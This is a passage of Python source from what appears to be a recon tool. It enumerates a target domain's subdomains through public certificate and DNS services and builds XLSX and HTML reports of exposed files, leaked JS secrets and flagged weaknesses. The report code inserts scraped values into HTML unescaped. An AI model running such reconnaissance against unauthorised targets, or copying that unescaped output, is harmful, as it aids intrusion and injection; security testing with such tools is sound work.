        # VirusTotal passive DNS (no API key for basic)
        vt_data = await http_get(
            f"https://www.virustotal.com/vtapi/v2/domain/report?domain={self.domain}",
            timeout=15
        )
        # SecurityTrails free DNS history
        st_data = await http_get(
            f"https://api.securitytrails.com/v1/domain/{self.domain}/subdomains",
            timeout=15
        )

        # crt.sh extra query — broader wildcard
        crt_extra = await http_get(
            f"https://crt.sh/?q=%25.%25.{self.domain}&output=json",
            timeout=30
        )
        extra_subs = set()
        if crt_extra and crt_extra.strip().startswith("["):
            try:
                for e in __import__("json").loads(crt_extra):
                    for nm in e.get("name_value","").split("\n"):
                        nm = nm.replace("*.","").strip().lower()
                        if nm and self.domain in nm: extra_subs.add(nm)
            except Exception: pass
        if extra_subs:
            self.db.add_subdomains(list(extra_subs), "crt.sh-deep")
            found(f"crt.sh deep → {C.GREEN}{len(extra_subs)}{C.RESET} additional subs")

        # Certspotter (free, no auth)
        cert_data = await http_get(
            f"https://api.certspotter.com/v1/issuances?domain={self.domain}"
            f"&include_subdomains=true&expand=dns_names",
            timeout=20
        )
        cert_subs = set()
        if cert_data:
            try:
                for entry in __import__("json").loads(cert_data):
                    for name in entry.get("dns_names",[]):
                        n = name.replace("*.","").strip().lower()
                        if n and self.domain in n: cert_subs.add(n)
            except Exception: pass
        if cert_subs:
            self.db.add_subdomains(list(cert_subs), "certspotter")
            found(f"certspotter → {C.GREEN}{len(cert_subs)}{C.RESET} subdomains")

        # HackerTarget DNS lookup
        ht_data = await http_get(
            f"https://api.hackertarget.com/hostsearch/?q={self.domain}",
            timeout=15
        )
        ht_subs = set()
        if ht_data and "error" not in ht_data.lower()[:30]:
            for line in ht_data.splitlines():
                parts = line.split(",")
                if parts and self.domain in parts[0]:
                    ht_subs.add(parts[0].strip().lower())
        if ht_subs:
            self.db.add_subdomains(list(ht_subs), "hackertarget")
            found(f"hackertarget → {C.GREEN}{len(ht_subs)}{C.RESET} subdomains")

        # ThreatCrowd
        tc_data = await http_get(
            f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={self.domain}",
            timeout=15
        )
        tc_subs = set()
        if tc_data:
            try:
                tc_j = __import__("json").loads(tc_data)
                for sub in tc_j.get("subdomains",[]):
                    s = sub.strip().lower()
                    if s and self.domain in s: tc_subs.add(s)
            except Exception: pass
        if tc_subs:
            self.db.add_subdomains(list(tc_subs), "threatcrowd")
            found(f"threatcrowd → {C.GREEN}{len(tc_subs)}{C.RESET} subdomains")

        # RapidDNS (wildcard search)
        rd_data = await http_get(
            f"https://rapiddns.io/subdomain/{self.domain}?full=1",
            timeout=15
        )
        rd_subs = set()
        if rd_data:
            for m in re.finditer(r'([a-zA-Z0-9._-]+\.' + re.escape(self.domain) + r')', rd_data):
                s = m.group(1).lower().replace("*.","")
                if s: rd_subs.add(s)
        if rd_subs:
            self.db.add_subdomains(list(rd_subs), "rapiddns")
            found(f"rapiddns → {C.GREEN}{len(rd_subs)}{C.RESET} subdomains")

        # Write OSINT summary
        total_subs = self.db.count("subdomains")
        with open(f"{self.outdir}/raw/osint_summary.txt","w") as f:
            f.write(f"OSINT Summary for {self.domain}\n")
            f.write(f"{'='*50}\n")
            f.write(f"Total subdomains: {total_subs}\n")
            f.write(f"certspotter: {len(cert_subs)}\n")
            f.write(f"hackertarget: {len(ht_subs)}\n")
            f.write(f"threatcrowd: {len(tc_subs)}\n")
            f.write(f"rapiddns: {len(rd_subs)}\n")
            f.write(f"crt.sh-deep: {len(extra_subs)}\n")
        log(f"OSINT → {C.GREEN}{total_subs}{C.RESET} total unique subdomains after all sources")

    # ─── MODULE 13: REPORTS ───────────────────────────────────────────────
    async def generate_reports(self):
        section("MODULE 13 — GENERATING REPORTS")
        info("Building HTML report...")
        html = self._build_html()
        html_path = f"{self.outdir}/reports/reconx2_report_{self.domain}.html"
        with open(html_path,"w",encoding="utf-8") as f: f.write(html)
        success(f"HTML report → {html_path}")

        info("Building XLSX report...")
        try:
            import openpyxl
            wb = self._build_xlsx(openpyxl)
            if wb:
                xlsx_path = f"{self.outdir}/reports/reconx2_report_{self.domain}.xlsx"
                wb.save(xlsx_path)
                success(f"XLSX report → {xlsx_path}")
        except ImportError:
            warn("openpyxl not installed — run: pip3 install openpyxl")

    def _build_xlsx(self, openpyxl):
        from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
        from openpyxl.utils import get_column_letter

        NAVY="0D1B2A"; CYAN="00B4D8"; RED_C="EF233C"; GREEN_C="06D6A0"
        YELLOW_C="FFD166"; GRAY="F0F4F8"; WHITE="FFFFFF"; DARK="1A202C"; LGRAY="CBD5E0"

        def hf(bold=True,sz=11,c=WHITE): return Font(bold=bold,size=sz,color=c,name="Consolas")
        def bf(bold=False,sz=10,c=DARK): return Font(bold=bold,size=sz,color=c,name="Consolas")
        def fl(c): return PatternFill("solid",fgColor=c)
        def bd():
            s=Side(border_style="thin",color=LGRAY)
            return Border(left=s,right=s,top=s,bottom=s)
        def ctr(): return Alignment(horizontal="center",vertical="center",wrap_text=True)
        def lft(): return Alignment(horizontal="left",vertical="center",wrap_text=True)
        def hdr_row(ws,row,bg=NAVY):
            for cell in ws[row]:
                cell.font=hf(); cell.fill=fl(bg); cell.alignment=ctr(); cell.border=bd()
        def data_row(ws,rn,alt=False):
            bg=GRAY if alt else WHITE
            for cell in ws[rn]:
                cell.font=bf(); cell.fill=fl(bg); cell.alignment=lft(); cell.border=bd()
        def sheet_hdr(ws,title,cols=5):
            ws.merge_cells(f"A1:{get_column_letter(cols)}1")
            ws["A1"]=title
            ws["A1"].font=Font(bold=True,size=14,color=WHITE,name="Consolas")
            ws["A1"].fill=fl(NAVY); ws["A1"].alignment=ctr()
            ws.row_dimensions[1].height=32

        wb=openpyxl.Workbook()
        wb.remove(wb.active)
        ts=datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ── SUMMARY ──
        ws=wb.create_sheet("📊 Summary"); ws.sheet_view.showGridLines=False
        ws.column_dimensions["A"].width=32; ws.column_dimensions["B"].width=15; ws.column_dimensions["C"].width=50
        ws.merge_cells("A1:C1"); ws["A1"]=f"🔍 RECONX2 REPORT — {self.domain.upper()}"
        ws["A1"].font=Font(bold=True,size=16,color=WHITE,name="Consolas")
        ws["A1"].fill=fl(NAVY); ws["A1"].alignment=ctr(); ws.row_dimensions[1].height=44
        ws.merge_cells("A2:C2"); ws["A2"]=f"Generated: {ts}  |  Target: {self.domain}  |  Version: {VERSION}"
        ws["A2"].font=Font(size=10,color=LGRAY,name="Consolas")
        ws["A2"].fill=fl("1A2A3A"); ws["A2"].alignment=ctr(); ws.row_dimensions[2].height=20
        ws.append([])
        ws.append(["Category","Count","Output Location"])
        hdr_row(ws,ws.max_row,bg=CYAN)
        stats=[
            ("Total Subdomains",    self.db.count("subdomains"),                              "subdomains/all_subdomains.txt"),
            ("Live Hosts",          self.db.count("subdomains","is_live=1"),                  "subdomains/live_urls.txt"),
            ("Total URLs",          self.db.count("urls"),                                    "urls/all_urls.txt"),
            ("JavaScript Files",    self.db.count("urls","extension='.js'"),                  "js/js_files.txt"),
            ("Interesting Files",   self.db.count("urls","extension IN ('.env','.sql','.bak','.zip','.json')"), "files/interesting_files.txt"),
            ("URLs with Params",    self.db.count("urls","has_params=1"),                     "params/urls_with_params.txt"),
            ("Unique Parameters",   self.db.count("parameters"),                              "params/unique_params.txt"),
            ("Sensitive Paths",     self.db.count("sensitive_paths"),                         "files/sensitive_paths.txt"),
            ("CRITICAL Findings",   self.db.count("sensitive_paths","risk_level='CRITICAL'"), "files/sensitive_paths.txt"),
            ("HIGH Findings",       self.db.count("sensitive_paths","risk_level='HIGH'"),     "files/sensitive_paths.txt"),
            ("Nuclei Findings",     self.db.count("nuclei_findings"),                         "raw/nuclei_findings.txt"),
            ("JS Files w/ Secrets", self.db.count("js_files","has_secret=1"),                 "js/grep_secrets.txt"),
        ]
        for i,(cat,cnt,fp) in enumerate(stats):
            ws.append([cat,cnt,fp]); data_row(ws,ws.max_row,alt=(i%2==0))
            c=ws.cell(row=ws.max_row,column=2)
            if isinstance(cnt,int) and cnt>0:
                color=RED_C if "CRITICAL" in cat or "SECRET" in cat or "HIGH" in cat else GREEN_C
                c.fill=fl(color); c.font=Font(bold=True,size=10,color=WHITE,name="Consolas")
            c.alignment=ctr()
        ws.freeze_panes="A4"

        # ── SUBDOMAINS ──
        ws2=wb.create_sheet("🌐 Subdomains"); ws2.sheet_view.showGridLines=False
        sheet_hdr(ws2,f"Subdomains — {self.domain}",4)
        ws2.append(["#","Subdomain","Source","Live?"])
        hdr_row(ws2,ws2.max_row,bg=NAVY)
        for col,w in zip("ABCD",[6,55,25,10]): ws2.column_dimensions[col].width=w
        rows=self.db.conn.execute("SELECT subdomain,source,is_live FROM subdomains ORDER BY is_live DESC,subdomain").fetchall()
        for i,r in enumerate(rows,1):
            live="✅" if r[2] else "—"
            ws2.append([i,r[0],r[1],live]); data_row(ws2,ws2.max_row,alt=(i%2==0))
            ws2.cell(row=ws2.max_row,column=1).alignment=ctr()
            ws2.cell(row=ws2.max_row,column=4).alignment=ctr()
            if r[2]: ws2.cell(row=ws2.max_row,column=4).fill=fl(GREEN_C)
        ws2.freeze_panes="A3"

        # ── LIVE HOSTS ──
        ws3=wb.create_sheet("✅ Live Hosts"); ws3.sheet_view.showGridLines=False
        sheet_hdr(ws3,f"Live Hosts — {self.domain}",5)
        ws3.append(["#","Subdomain","Status","Title","Tech Stack"])
        hdr_row(ws3,ws3.max_row,bg="1A4D2E")
        for col,w in zip("ABCDE",[6,45,10,35,40]): ws3.column_dimensions[col].width=w
        rows=self.db.conn.execute("SELECT subdomain,status_code,title,tech FROM subdomains WHERE is_live=1").fetchall()
        for i,r in enumerate(rows,1):
            ws3.append([i,r[0],r[1] or "—",r[2] or "—",r[3] or "—"])
            data_row(ws3,ws3.max_row,alt=(i%2==0))
            ws3.cell(row=ws3.max_row,column=1).alignment=ctr()
            sc=ws3.cell(row=ws3.max_row,column=3); sc.alignment=ctr()
            code=r[1] or ""
            if code.startswith("2"): sc.fill=fl(GREEN_C); sc.font=Font(bold=True,size=10,color=WHITE,name="Consolas")
            elif code.startswith("3"): sc.fill=fl(YELLOW_C); sc.font=Font(bold=True,size=10,name="Consolas")
            elif code.startswith("4"): sc.fill=fl("FF6B35"); sc.font=Font(bold=True,size=10,color=WHITE,name="Consolas")
        ws3.freeze_panes="A3"

        # ── URLS ──
        ws4=wb.create_sheet("⏳ URLs"); ws4.sheet_view.showGridLines=False
        sheet_hdr(ws4,f"Discovered URLs — {self.domain}",5)
        ws4.append(["#","URL","Extension","Has Params","Source"])
        hdr_row(ws4,ws4.max_row,bg="2D2D2D")
        for col,w in zip("ABCDE",[6,80,12,12,15]): ws4.column_dimensions[col].width=w
        rows=self.db.conn.execute("SELECT url,extension,has_params,source FROM urls ORDER BY id LIMIT 5000").fetchall()
        for i,r in enumerate(rows,1):
            hp="✓" if r[2] else ""
            ws4.append([i,r[0],r[1] or "—",hp,r[3] or "—"])
            data_row(ws4,ws4.max_row,alt=(i%2==0))
            ws4.cell(row=ws4.max_row,column=1).alignment=ctr()
            ws4.cell(row=ws4.max_row,column=4).alignment=ctr()
            if r[2]:
                c=ws4.cell(row=ws4.max_row,column=4)
                c.fill=fl(YELLOW_C); c.font=Font(bold=True,size=10,name="Consolas")
        ws4.freeze_panes="A3"

        # ── SENSITIVE PATHS ──
        ws5=wb.create_sheet("🚨 Sensitive Paths"); ws5.sheet_view.showGridLines=False
        sheet_hdr(ws5,f"Sensitive Findings — {self.domain}",5)
        ws5.append(["#","Status","URL","Risk Level","Notes"])
        hdr_row(ws5,ws5.max_row,bg=RED_C)
        for col,w in zip("ABCDE",[6,10,70,15,40]): ws5.column_dimensions[col].width=w
        RISK_COLORS={"CRITICAL":RED_C,"HIGH":"FF6B35","MEDIUM":YELLOW_C,"LOW":"4ECDC4","INFO":LGRAY}
        rows=self.db.conn.execute("SELECT url,status_code,risk_level,notes FROM sensitive_paths ORDER BY CASE risk_level WHEN 'CRITICAL' THEN 1 WHEN 'HIGH' THEN 2 WHEN 'MEDIUM' THEN 3 ELSE 4 END").fetchall()
        for i,r in enumerate(rows,1):
            ws5.append([i,r[1],r[0],r[2],r[3]]); data_row(ws5,ws5.max_row,alt=(i%2==0))
            ws5.cell(row=ws5.max_row,column=1).alignment=ctr()
            ws5.cell(row=ws5.max_row,column=2).alignment=ctr()
            rc=ws5.cell(row=ws5.max_row,column=4)
            rc.fill=fl(RISK_COLORS.get(r[2],LGRAY)); rc.alignment=ctr()
            rc.font=Font(bold=True,size=10,color=WHITE if r[2] not in ["MEDIUM","LOW"] else DARK,name="Consolas")
        ws5.freeze_panes="A3"

        # ── JS FILES ──
        ws6=wb.create_sheet("📜 JavaScript"); ws6.sheet_view.showGridLines=False
        sheet_hdr(ws6,f"JavaScript Files — {self.domain}",3)
        ws6.append(["#","JS File URL","Has Secrets?"])
        hdr_row(ws6,ws6.max_row,bg="3D348B")
        for col,w in zip("ABC",[6,80,15]): ws6.column_dimensions[col].width=w
        rows=self.db.conn.execute("SELECT url,has_secret FROM js_files ORDER BY has_secret DESC").fetchall()
        if not rows:
            js_list=read_file(f"{self.outdir}/js/js_files.txt")
            rows=[(u,0) for u in js_list]
        for i,r in enumerate(rows,1):
            hs="⚠ YES" if r[1] else "No"
            ws6.append([i,r[0],hs]); data_row(ws6,ws6.max_row,alt=(i%2==0))
            ws6.cell(row=ws6.max_row,column=1).alignment=ctr()
            ws6.cell(row=ws6.max_row,column=3).alignment=ctr()
            if r[1]:
                c=ws6.cell(row=ws6.max_row,column=3)
                c.fill=fl(RED_C); c.font=Font(bold=True,size=10,color=WHITE,name="Consolas")
        ws6.freeze_panes="A3"

        # ── PARAMETERS ──
        ws7=wb.create_sheet("🔧 Parameters"); ws7.sheet_view.showGridLines=False
        sheet_hdr(ws7,f"Parameters — {self.domain}",4)
        ws7.append(["#","Count","Parameter","Potential Vulnerability"])
        hdr_row(ws7,ws7.max_row,bg="0F3460")
        for col,w in zip("ABCD",[6,15,30,38]): ws7.column_dimensions[col].width=w
        rows=self.db.conn.execute("SELECT param,count,potential_vuln FROM parameters ORDER BY count DESC").fetchall()
        for i,r in enumerate(rows,1):
            ws7.append([i,r[1],r[0],r[2] or "—"]); data_row(ws7,ws7.max_row,alt=(i%2==0))
            ws7.cell(row=ws7.max_row,column=1).alignment=ctr()
            ws7.cell(row=ws7.max_row,column=2).alignment=ctr()
            if r[2] and r[2]!="—":
                c=ws7.cell(row=ws7.max_row,column=4)
                c.fill=fl(YELLOW_C); c.font=Font(bold=True,size=10,name="Consolas")
        ws7.freeze_panes="A3"

        # ── NUCLEI ──
        ws8=wb.create_sheet("🛡 Nuclei"); ws8.sheet_view.showGridLines=False
        sheet_hdr(ws8,f"Nuclei Findings — {self.domain}",4)
        ws8.append(["#","Severity","Template / Finding","URL"])
        hdr_row(ws8,ws8.max_row,bg=RED_C)
        for col,w in zip("ABCD",[6,14,55,60]): ws8.column_dimensions[col].width=w
        SEV_C={"critical":RED_C,"high":"FF6B35","medium":YELLOW_C,"low":"4ECDC4","info":LGRAY}
        rows=self.db.conn.execute("SELECT severity,template,url FROM nuclei_findings ORDER BY CASE severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 ELSE 4 END").fetchall()
        for i,r in enumerate(rows,1):
            ws8.append([i,r[0].upper(),r[1][:100],r[2]]); data_row(ws8,ws8.max_row,alt=(i%2==0))
            ws8.cell(row=ws8.max_row,column=1).alignment=ctr()
            sc=ws8.cell(row=ws8.max_row,column=2)
            sc.fill=fl(SEV_C.get(r[0].lower(),LGRAY)); sc.alignment=ctr()
            sc.font=Font(bold=True,size=10,color=WHITE if r[0].lower() not in ["medium","low"] else DARK,name="Consolas")
        if not rows:
            ws8.append([1,"INFO","No findings (or nuclei not run)","—"]); data_row(ws8,ws8.max_row)
        ws8.freeze_panes="A3"

        # ── DNS & SSL ──
        ws9=wb.create_sheet("🔷 DNS & SSL"); ws9.sheet_view.showGridLines=False
        sheet_hdr(ws9,f"DNS & SSL — {self.domain}",2)
        ws9.append(["Record Type","Value"]); hdr_row(ws9,ws9.max_row,bg="0A3D62")
        ws9.column_dimensions["A"].width=20; ws9.column_dimensions["B"].width=70
        rows=self.db.conn.execute("SELECT record_type,value FROM dns_records ORDER BY record_type").fetchall()
        for i,r in enumerate(rows):
            ws9.append([r[0],r[1]]); data_row(ws9,ws9.max_row,alt=(i%2==0))
        ssl_text=""
        try:
            with open(f"{self.outdir}/ssl/ssl_analysis.txt") as f: ssl_text=f.read()
        except: pass
        ws9.append([]); ws9.append(["SSL Info",ssl_text[:5000] if ssl_text else "—"])
        ws9.freeze_panes="A3"

        # ── DORKS ──
        ws10=wb.create_sheet("🔍 OSINT Dorks"); ws10.sheet_view.showGridLines=False
        sheet_hdr(ws10,f"OSINT Dorks — {self.domain}",2)
        ws10.append(["Category","Dork Query"]); hdr_row(ws10,ws10.max_row,bg="1B1B2F")
        ws10.column_dimensions["A"].width=32; ws10.column_dimensions["B"].width=72
        try:
            with open(f"{self.outdir}/raw/google_dorks.txt") as f:
                cur=""
                for line in f:
                    line=line.strip()
                    if line.startswith("[") and line.endswith("]"): cur=line.strip("[]")
                    elif line.startswith("site:") or line.startswith('"') or line.startswith("hostname"):
                        ws10.append([cur,line]); data_row(ws10,ws10.max_row,alt=(ws10.max_row%2==0))
        except: pass
        ws10.freeze_panes="A3"

        # ── SCREENSHOTS SHEET ────────────────────────────────────────────
        ws11=wb.create_sheet("📷 Screenshots"); ws11.sheet_view.showGridLines=False
        sheet_hdr(ws11,f"Screenshots — {self.domain}",4)
        ws11.append(["#","Filename","Host","Screenshot"])
        hdr_row(ws11,ws11.max_row,bg="1A3D2E")
        ws11.column_dimensions["A"].width=6
        ws11.column_dimensions["B"].width=45
        ws11.column_dimensions["C"].width=40
        ws11.column_dimensions["D"].width=22

        ss_dir   = f"{self.outdir}/screenshots"
        ss_tool  = self.db.get_meta("screenshot_tool","unknown")
        ss_count = 0
        try:
            ss_files = sorted([f for f in os.listdir(ss_dir)
                               if f.lower().endswith(('.png','.jpg','.jpeg'))])
        except FileNotFoundError:
            ss_files = []

        if ss_files:
            try:
                from openpyxl.drawing.image import Image as XLImage
                can_embed = True
            except ImportError:
                can_embed = False

            for i,fname in enumerate(ss_files[:100], 1):  # cap at 100 images
                fpath    = os.path.join(ss_dir, fname)
                host_hint= re.sub(r'[_]+','.',fname.split('.')[0])[:40]
                ws11.append([i, fname, host_hint, ""])
                data_row(ws11, ws11.max_row, alt=(i%2==0))
                ws11.row_dimensions[ws11.max_row].height = 80

                if can_embed and os.path.exists(fpath):
                    try:
                        img = XLImage(fpath)
                        img.width  = 140
                        img.height = 78
                        cell = f"D{ws11.max_row}"
                        ws11.add_image(img, cell)
                        ss_count += 1
                    except Exception:
                        ws11.cell(row=ws11.max_row,column=4).value = f"[see {fpath}]"
                        ss_count += 1
                else:
                    ws11.cell(row=ws11.max_row,column=4).value = f"[see {fpath}]"
                    ss_count += 1

            ws11.freeze_panes="A3"
        else:
            ws11.append([1,"No screenshots captured","",
                         "Install gowitness: go install github.com/sensepost/gowitness@latest"])
            data_row(ws11,ws11.max_row)

        # Add summary note
        ws11.append([])
        ws11.append(["","Tool used:",ss_tool,""])
        ws11.append(["","Total captured:",ss_count,""])

        return wb

    def _build_html(self) -> str:
        ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        dur     = int(time.time() - self.start_time)
        dur_str = f"{dur//3600}h {(dur%3600)//60}m {dur%60}s"

        n_subs   = self.db.count("subdomains")
        n_live   = self.db.count("subdomains","is_live=1")
        n_urls   = self.db.count("urls")
        n_js     = self.db.count("urls","extension='.js'")
        n_sens   = self.db.count("sensitive_paths","risk_level!='UNCONFIRMED'")
        n_crit   = self.db.count("sensitive_paths","risk_level='CRITICAL'")
        n_high   = self.db.count("sensitive_paths","risk_level='HIGH'")
        n_med    = self.db.count("sensitive_paths","risk_level='MEDIUM'")
        n_unconf = self.db.count("sensitive_paths","risk_level='UNCONFIRMED'")
        n_nuc    = self.db.count("nuclei_findings")
        n_params = self.db.count("parameters")
        n_sec_js = self.db.count("js_files","has_secret=1")
        n_nuc_c  = self.db.count("nuclei_findings","severity='critical'")
        n_nuc_h  = self.db.count("nuclei_findings","severity='high'")
        n_nuc_m  = self.db.count("nuclei_findings","severity='medium'")
        # Phase 1 counts
        # Phase 2 counts
        # Phase 3 counts
        # Phase 4 counts
        risk_score_val = self.db.get_meta("risk_score","?")
        risk_label_val = self.db.get_meta("risk_label","UNKNOWN")
        n_bb_reports = len([f for f in __import__("os").listdir(f"{self.outdir}/reports/bug_bounty") if f.endswith(".md")]) if __import__("os").path.exists(f"{self.outdir}/reports/bug_bounty") else 0
        n_jwt    = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'JWT%'").fetchone()[0]
        n_defcr  = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Default cred%'").fetchone()[0]
        n_rl     = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'No rate limit%'").fetchone()[0]
        n_pp     = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Prototype%'").fetchone()[0]
        n_crlf   = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'CRLF%'").fetchone()[0]
        n_github     = 1 if os.path.exists(f"{self.outdir}/raw/github_findings.txt") else 0
        n_swagger_ep = self.db.count("urls","source='swagger'")
        n_ssrf   = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'SSRF%'").fetchone()[0]
        n_domxss = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'DOM XSS%'").fetchone()[0]
        n_wayb   = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE '%Wayback%'").fetchone()[0]
        n_403bp  = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE '403 BYPASS%'").fetchone()[0]
        n_cors   = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'CORS:%'").fetchone()[0]
        n_redir  = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Open redirect%'").fetchone()[0]
        n_buck   = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'Cloud bucket%'").fetchone()[0]
        n_gql    = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE 'GraphQL%'").fetchone()[0]
        n_idor   = self.db.conn.execute("SELECT COUNT(*) FROM sensitive_paths WHERE notes LIKE '%IDOR%'").fetchone()[0]

        ss_dir = f"{self.outdir}/screenshots"
        try:
            ss_files = sorted([f for f in os.listdir(ss_dir)
                                if f.lower().endswith(('.png','.jpg','.jpeg'))])
        except Exception:
            ss_files = []
        n_shots = len(ss_files)
        ss_tool = self.db.get_meta("screenshot_tool","unknown")

        def rp(fp, limit=4000):
            try:
                with open(fp) as fh: return fh.read()[:limit]
            except Exception: return "No data."

        def sub_rows():
            rows = self.db.conn.execute(
                "SELECT subdomain,source,is_live FROM subdomains ORDER BY is_live DESC,subdomain"
            ).fetchall()
            out = []
            for i,r in enumerate(rows):
                live = '<span class="pill g">LIVE</span>' if r[2] else '<span class="pill z">--</span>'
                se   = r[0].replace("'", "\\'")
                out.append(
                    f'<tr><td class="num">{i+1}</td>'
                    f'<td class="mono cc" data-v="{r[0]}">{r[0]}'
                    f'<button class="cpb" onclick="cp(\'{se}\',this)">Copy</button></td>'
                    f'<td><span class="tag">{r[1]}</span></td><td>{live}</td></tr>'
                )
            return "".join(out)

        def live_rows():
            rows = self.db.conn.execute(
                "SELECT subdomain,status_code,title,tech FROM subdomains WHERE is_live=1 ORDER BY subdomain"
            ).fetchall()
            out = []
            for i,r in enumerate(rows):
                c    = r[1] or "?"
                ccls = "c2" if c.startswith("2") else "c3" if c.startswith("3") else "c4" if c.startswith("4") else "c5"
                tp   = "".join(
                    f'<span class="ttag">{t.strip()[:18]}</span>'
                    for t in (r[3] or "").split(",")[:4] if t.strip()
                )
                out.append(
                    f'<tr><td class="num">{i+1}</td>'
                    f'<td class="mono"><a href="https://{r[0]}" target="_blank">{r[0]}</a></td>'
                    f'<td><span class="cb {ccls}">{c}</span></td>'
                    f'<td class="dim">{(r[2] or "")[:55]}</td><td>{tp}</td></tr>'
                )
            return "".join(out)

        def url_rows():
            rows = self.db.conn.execute(
                "SELECT url,extension,has_params,source FROM urls ORDER BY id LIMIT 5000"
            ).fetchall()
            out = []
            for i,r in enumerate(rows):
                hp  = '<span class="pill y">params</span>' if r[2] else ""
                ecl = " xe" if r[1] in [".env",".sql",".bak",".zip",".key",".pem",".log"] else ""
                out.append(
                    f'<tr><td class="num">{i+1}</td>'
                    f'<td class="mono uc"><a href="{r[0]}" target="_blank">{r[0][:130]}</a></td>'
                    f'<td><code class="xt{ecl}">{r[1] or "--"}</code></td>'
                    f'<td>{hp}</td><td><span class="tag">{r[3]}</span></td></tr>'
                )
            return "".join(out)

        def sens_rows():
            rows = self.db.conn.execute("""
                SELECT url,status_code,risk_level,notes FROM sensitive_paths
                WHERE risk_level!='UNCONFIRMED'
                ORDER BY CASE risk_level WHEN 'CRITICAL' THEN 1 WHEN 'HIGH' THEN 2
                WHEN 'MEDIUM' THEN 3 ELSE 4 END
            """).fetchall()
            RC = {"CRITICAL":"rc","HIGH":"rh","MEDIUM":"rm","LOW":"rl","INFO":"ri"}
            CC = {"2":"c2","3":"c3","4":"c4","5":"c5"}
            out = []
            for i,r in enumerate(rows):
                rc = RC.get(r[2],"ri")
                cc = CC.get(str(r[1] or "")[:1],"c4")
                out.append(
                    f'<tr><td class="num">{i+1}</td>'
                    f'<td><span class="cb {cc}">{r[1]}</span></td>'
                    f'<td class="mono"><a href="{r[0]}" target="_blank">{r[0]}</a></td>'
                    f'<td><span class="rb {rc}">{r[2]}</span></td>'
                    f'<td class="dim">{r[3]}</td></tr>'
                )
            return "".join(out) or '<tr><td colspan="5" class="empty">No confirmed findings</td></tr>'

        def param_rows():
            rows = self.db.conn.execute(
                "SELECT param,count,potential_vuln FROM parameters ORDER BY count DESC LIMIT 500"
            ).fetchall()
            out = []
            for i,r in enumerate(rows):
                v  = r[2] or "--"
                vc = ' class="vt"' if v != "--" else ""
                out.append(
                    f'<tr><td class="num">{i+1}</td><td class="num">{r[1]}</td>'
                    f'<td><code class="pt">{r[0]}</code></td>'
                    f'<td><span{vc}>{v}</span></td></tr>'
                )
            return "".join(out)

        def nuc_rows():
            rows = self.db.conn.execute("""
                SELECT severity,template,url FROM nuclei_findings
                ORDER BY CASE severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2
                WHEN 'medium' THEN 3 ELSE 4 END
            """).fetchall()
            SC = {"critical":"rc","high":"rh","medium":"rm","low":"rl","info":"ri"}
            out = []
            for i,r in enumerate(rows):
                cls = SC.get(r[0].lower(),"ri")
                out.append(
                    f'<tr><td class="num">{i+1}</td>'
                    f'<td><span class="rb {cls}">{r[0].upper()}</span></td>'
                    f'<td class="mono">{r[1][:100]}</td>'
                    f'<td class="mono"><a href="{r[2]}" target="_blank">{r[2][:80]}</a></td></tr>'
                )
            return "".join(out) or '<tr><td colspan="4" class="empty">No nuclei findings</td></tr>'

        def js_rows():
            rows = self.db.conn.execute(
                "SELECT url,has_secret,secrets FROM js_files ORDER BY has_secret DESC"
            ).fetchall()
            if not rows:
                rows = [(u, 0, "") for u in read_file(f"{self.outdir}/js/js_files.txt")]
            out = []
            for i,r in enumerate(rows[:500]):
                url, has_sec, secrets_raw = r[0], r[1], r[2] or ""
                # Build finding labels from secrets
                if has_sec and secrets_raw:
                    types = set()
                    for line in secrets_raw.splitlines()[:5]:
                        m = re.search(r"\[([^\]]+)\]", line)
                        if m: types.add(m.group(1)[:25])
                    badges = "".join(f'<span class="rb rc" style="margin:1px">{t}</span>' for t in list(types)[:3])
                    finding = badges or '<span class="rb rc">SECRETS</span>'
                else:
                    finding = '<span class="pill z">Clean</span>'
                out.append(
                    f'<tr><td class="num">{i+1}</td>'
                    f'<td class="mono"><a href="{url}" target="_blank">{url[:120]}</a></td>'
                    f'<td>{finding}</td></tr>'
                )
            return "".join(out) or '<tr><td colspan="3" class="empty">No JS files</td></tr>'

        def dns_rows():
            rows = self.db.conn.execute(
                "SELECT record_type,value FROM dns_records ORDER BY record_type"
            ).fetchall()
            return "".join(
                f'<tr><td><code class="xt">{r[0]}</code></td>'
                f'<td class="mono">{r[1]}</td></tr>'
                for r in rows
            )

        def js_endpoints_text():
            try:
                rows = self.db.conn.execute(
                    "SELECT url,endpoints FROM js_files WHERE endpoints!='' ORDER BY url"
                ).fetchall()
                if not rows: return "No endpoints extracted."
                lines = []
                for url, eps in rows:
                    if eps and eps.strip():
                        lines.append(f"=== {url[:80]} ===")
                        for ep in eps.splitlines()[:20]:
                            lines.append(f"  {ep}")
                        lines.append("")
                return "\n".join(lines)[:5000] or "No endpoints extracted."
            except Exception:
                return "No endpoint data."

        def ss_gallery():
            if not ss_files:
                gw_p    = tool_resolve("gowitness") or "not found"
                chr_p   = tool_resolve("chromium") or "/usr/bin/chromium"
                return (
                    '<div class="ss-empty">'
                    '<svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor"'
                    ' stroke-width="1.5" style="color:#2a3f58;margin-bottom:14px">'
                    '<rect x="3" y="3" width="18" height="18" rx="2"/>'
                    '<circle cx="8.5" cy="8.5" r="1.5"/>'
                    '<polyline points="21 15 16 10 5 21"/></svg>'
